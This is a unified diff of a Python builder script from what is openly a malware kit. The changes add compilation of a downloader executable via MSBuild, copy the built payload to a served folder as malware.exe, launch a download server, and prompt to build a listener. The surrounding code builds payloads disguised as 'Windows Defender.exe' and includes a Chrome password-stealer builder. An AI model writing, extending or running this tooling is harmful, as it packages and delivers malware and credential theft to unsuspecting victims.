@@ -1,11 +1,23 @@
-from progress.spinner import Spinner
 import argparse
 import configparser
 import os
+import shutil
+import subprocess
 import sys
 import time
 from builtins import KeyboardInterrupt
+from multiprocessing import Process
+from os.path import exists
 from subprocess import call
+
+import win32com.shell.shell as shell
+from progress.spinner import Spinner
+
+
+def run_server():
+    print("Starting Download Server")
+    os.system(f"start cmd /K {sys.executable} server.py")
+
 
 if sys.platform == "linux":
     print("""
@@ -30,6 +42,34 @@ CONFIG.read(CONFIG_FILE)
 __VERSION = CONFIG["DEFAULT"]["VersionLong"]
 
 
+def get_csc():
+    csc_test = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\MSBuild.exe"
+    return csc_test
+
+
+def create_downloader():
+    csc = get_csc()
+    dir_path = os.path.dirname(os.path.realpath(__file__))
+    dwn = "templates/downloader/downloader.sln\" /t:test"
+    print(dir_path)
+    commands = f"{csc} \"{dir_path}/{dwn}"
+    print(commands)
+    a = subprocess.Popen(commands, stdin=subprocess.PIPE,
+                         stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+    print(a.stdout.read().decode())
+    print(a.stderr.read().decode())
+
+    pathFile = "templates\\downloader\\downloader\\bin\\Release\\downloader.exe"
+
+    # try:
+    #     if os.path.exists(pathFile):
+    #         os.rename(pathFile, "builds\\downloader.exe")
+    #     os.removedirs("templates/downloader/downloader/bin")
+    #     os.removedirs("templates/downloader/downloader/obj")
+    # except:
+    #     print("oops")
+
+
 def check_folders():
     if not os.path.exists("builds"):
         os.mkdir("builds")
@@ -37,25 +77,30 @@ def check_folders():
         os.mkdir("listeners")
 
 
-def build_listener(args):
-    if args.max_connections:
-        connections_max = args.max_connections
-    else:
-        connections_max = CONFIG["LISTENER"]["CONNECTIONS_MAX"]
-    temp_listener = CONFIG["TEMPLATES"]["listener"]
+def build_listener(args, bypass=False):
     check_folders()
-    port = args.p
+    interact = True
+    temp_listener = CONFIG["TEMPLATES"]["listener"]
+    if not bypass:
+        if args.max_connections:
+            connections_max = args.max_connections
+        else:
+            connections_max = CONFIG["LISTENER"]["CONNECTIONS_MAX"]
+        port = args.p
+        if not args.no_interact:
+            interact = False
+    else:
+        port = args
+        connections_max = CONFIG["LISTENER"]["CONNECTIONS_MAX"]
     with open(temp_listener, "r") as f:
         listener_script = f.read()
-
     listener_script_final = listener_script.replace(
         "<<PORT>>", str(port))
     listener_script_final = listener_script_final.replace(
         "<<CONNECTIONS_MAX>>", connections_max)
     with open("listeners/listener.py", "w") as f:
         f.write(listener_script_final)
-
-    if not args.no_interact:
+    if interact:
         while True:
             start = input("Would you like to start the listener? [y/n]> ")
             if start.lower() == "y" or start.lower() == 'yes':
@@ -134,6 +179,7 @@ def build_malware(args):
 
     build.exebuild(target=target, include=include,
                    output=output, icon="icons/icon.ico")
+    shutil.copyfile(f"{output}.exe", "templates/serve/malware.exe")
     remove = [f'_malkit/{payload_name}.py',
               'Windows Defender.exe', 'malware.py', 'stub.py']
     for file in remove:
@@ -149,10 +195,22 @@ def build_malware(args):
     time.sleep(1)
     os.system("cls")
     print("You can locate the generated file in the builds folder.")
+    create_downloader()
+    run_server()
+    done = False
+    while not done:
+        listener_build = input(
+            "Would you like to build the listener too? [Y/N]: ")
+        if listener_build.lower() == "y":
+            build_listener(port, bypass=True)
+            done = True
+        elif listener_build.lower() == "n":
+            done = True
     return len(stub_final)
 
 
 def build_chromepass(args):
+    check_folders()
     if args.load:
         print("Loading from file...")
         print("Not implemented yet")
